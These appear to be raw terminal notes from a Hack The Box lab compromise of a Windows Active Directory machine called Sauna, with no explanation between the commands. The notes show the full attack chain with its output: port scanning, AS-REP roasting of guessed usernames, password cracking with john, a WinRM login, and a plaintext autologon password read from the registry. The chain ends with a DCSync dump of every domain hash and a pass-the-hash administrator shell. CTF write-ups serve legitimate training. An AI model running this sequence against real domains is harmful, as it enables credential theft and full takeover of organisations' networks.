
NMAP:
root@kali:~# nmap -A 10.10.10.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-11 01:45 EDT
Nmap scan report for 10.10.10.175
Host is up (0.010s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-03-11 13:46:06Z)                                                                                                                        
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                                                                                                 
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                         
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)                                                                             
445/tcp  open  microsoft-ds?                                                                                                                                                                                       
464/tcp  open  kpasswd5?                                                                                                                                                                                           
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                                                                                                                   
636/tcp  open  tcpwrapped                                                                                                                                                                                          
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)                                                                             
3269/tcp open  tcpwrapped                                                                                                                                                                                          
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                       
SF-Port53-TCP:V=7.80%I=7%D=3/11%Time=5E687B0C%P=x86_64-pc-linux-gnu%r(DNSV                                                                                                                                         
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\                                                                                                                                         
SF:x04bind\0\0\x10\0\x03");                                                                                                                                                                                        
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                              
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                                                                  
No OS matches for host                                                                                                                                                                                             
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m21s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-11T13:48:28
|_  start_date: N/A

ldap enum:
rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
FQDN:SAUNA.EGOTISTICAL-BANK.LOCAL

root@kali:~/Documents/impacket/examples# cat ~/Documents/HackTheBox/users.txt 
Fergus.Smith 
Hugo.Bear
Steven.Kerb
Shaun.Coins
Bowie.Taylor
Sophie.Driver
FSmith 
HBear
SKerb
SCoins
BTaylor
SDriver
FergusS
Hugo Bear
StevenK
ShaunC
BowieT
SophieD
FergusSmith 
HugoBear
StevenKerb
ShaunCoins
BowieTaylor
SophieDriver
fergus.smith 
hugo.bear
steven.kerb
shaun.coins
bowie.taylor
sophie.driver
fsmith 
hbear
skerb
scoins
btaylor
sdriver
ferguss
hugo bear
stevenk
shaunc
bowiet
sophied
fergussmith
hugobear
stevenkerb
shauncoins
bowietaylor
sophiedriver

root@kali:~/Documents/impacket/examples# python3 GetNPUsers.py egotistical-bank.local/ -usersfile /root/Documents/HackTheBox/users.txt -format hashcat -no-pass -dc-ip 10.10.10.175 -outputfile hashes.asreproast

root@kali:~/Documents/HackTheBox# john --wordlist=/usr/share/wordlists/rockyou.txt kerbroast.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL)
Thestrokes23     ($krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL)
2g 0:00:00:14 DONE (2020-03-11 02:08) 0.1376g/s 725327p/s 1450Kc/s 1450KC/s Thing..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed

root@kali:~/Documents/impacket/examples#evil-winrm -i '10.10.10.175' -u 'fsmith' -p 'Thestrokes23'

*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x8e3982368
    ShutdownFlags    REG_DWORD    0x80000027
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

*Evil-WinRM* PS C:\Users\FSmith\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr

bash: !@10.10.10.175: event not found
root@kali:~/Documents/impacket/examples# python3 secretsdump.py "svc_loanmgr:Moneymakestheworldgoround!"@10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:1067f7c1f1965c4446d956787a069548:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0
Administrator:des-cbc-md5:19d5f15d689b1ce5
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:baaab5b85466a7e3db6338db62147337d3ede8e00d4279e8a6e7f08cdc1250de
SAUNA$:aes128-cts-hmac-sha1-96:8ba25e99b12fdd6a51903b4d4781cc9d
SAUNA$:des-cbc-md5:104c515b86739e08



root@kali:~/Documents/impacket/examples# python3 wmiexec.py -hashes :d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
egotisticalbank\administrator

C:\Users\Administrator\Desktop>type root.txt
f3ee04965c68257382e31502cc5e881f
